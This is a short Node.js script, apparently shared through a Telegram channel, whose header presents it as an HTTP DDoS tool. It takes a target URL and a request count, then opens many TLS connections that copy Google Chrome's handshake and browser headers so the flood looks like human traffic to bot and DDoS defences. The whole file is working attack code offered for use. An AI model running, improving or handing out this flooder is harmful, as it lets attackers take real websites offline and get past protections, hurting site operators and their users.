/*
t.me/xxiinn

BASE 0%HTTP-DDOS NEW SIMPEL HANDSHAKE USING TLS-HELLO LIKE GOOGLE CHROME 100% LIKELY HUMAN
*/

const tls = require("tls")
const url = require("url")

if (process.argv.length < 4) {
    console.log("usage: node file.js url jumlah_req")
    process.exit()
}

const target = process.argv[2]
const total = parseInt(process.argv[3])

const parsed = new URL(target)

const host = parsed.hostname
const port = parsed.port || 443

const cipherSuites = [
"TLS_AES_128_GCM_SHA256",
"TLS_AES_256_GCM_SHA384",
"TLS_CHACHA20_POLY1305_SHA256",
"ECDHE-RSA-AES128-GCM-SHA256"
].join(":")

function sendRequest() {

    const socket = tls.connect({

        host: host,
        port: port,

        servername: host,

        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",

        ciphers: cipherSuites,

        ALPNProtocols: [
            "h2",
            "http/1.1"
        ],

        sigalgs: [
            "ecdsa_secp256r1_sha256",
            "rsa_pss_rsae_sha256",
            "rsa_pkcs1_sha256"
        ].join(":"),

        ecdhCurve: "X25519:P-256:P-384",

        honorCipherOrder: true,

        rejectUnauthorized: false

    }, () => {

const req =
`GET ${parsed.pathname || "/"} HTTP/1.1\r
Host: ${host}\r
Connection: keep-alive\r
Cache-Control: max-age=0\r
Sec-Ch-Ua: "Chromium";v="122", "Google Chrome";v="122", "Not:A-Brand";v="99"\r
Sec-Ch-Ua-Mobile: ?0\r
Sec-Ch-Ua-Platform: "Windows"\r
Upgrade-Insecure-Requests: 1\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r
Sec-Fetch-Site: none\r
Sec-Fetch-Mode: navigate\r
Sec-Fetch-User: ?1\r
Sec-Fetch-Dest: document\r
Accept-Encoding: gzip, deflate, br\r
Accept-Language: en-US,en;q=0.9\r
\r
`

        socket.write(req)

    })

    socket.on("data", () => {})

    socket.on("error", () => {})

    socket.on("end", () => {
        socket.destroy()
    })
}

for (let i = 0; i < total; i++) {
    sendRequest()
}